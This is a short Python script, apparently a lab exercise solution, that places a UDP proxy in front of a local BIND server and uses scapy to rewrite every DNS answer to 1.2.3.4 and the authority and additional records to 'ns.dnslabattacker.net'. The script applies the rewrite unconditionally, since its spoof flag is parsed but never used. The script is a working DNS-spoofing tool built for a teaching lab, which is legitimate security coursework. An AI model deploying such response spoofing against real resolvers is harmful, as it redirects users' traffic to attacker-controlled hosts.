#!/usr/bin/env python
import argparse
import socket
from scapy.all import *

# This is going to Proxy in front of the Bind Server

parser = argparse.ArgumentParser()
parser.add_argument("--port", help="port to run your proxy on - careful to not run it on the same port as the BIND server", type=int)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int)
parser.add_argument("--spoof_response", action="store_true", help="flag to indicate whether you want to spoof the BIND Server's response (Part 3) or return it as is (Part 2). Set to True for Part 3 and False for Part 2", default=False)
args = parser.parse_args()

# Port to run the proxy on
port = args.port
# BIND's port
dns_port = args.dns_port
# Flag to indicate if the proxy should spoof responses
SPOOF = args.spoof_response

BUFSIZE = 4096

#UDP Socket
dns_socket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

#Bind to dns port
dns_socket.connect(("localhost",dns_port))

#UDP Socket
proxy_socket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

#Bind to proxy port
proxy_socket.bind(("localhost",port))
print("Hello")
while 1:
	print('InWhile')
	message,addr = proxy_socket.recvfrom(BUFSIZE)
	print(message)
	dns_socket.send(message)
	res = dns_socket.recv(BUFSIZE)
	res = DNS(res)
	newAN = '1.2.3.4'
	newNS = 'ns.dnslabattacker.net'
	
	
	for i in range(res.ancount):
		res.an[i].rdata = newAN
	for i in range(res.nscount):
		res.ns[i].rdata = newNS
	for i in range(res.arcount):
		res.ar[i].rrname = newNS
	print('res')
	proxy_socket.sendto(str(res), addr)
	


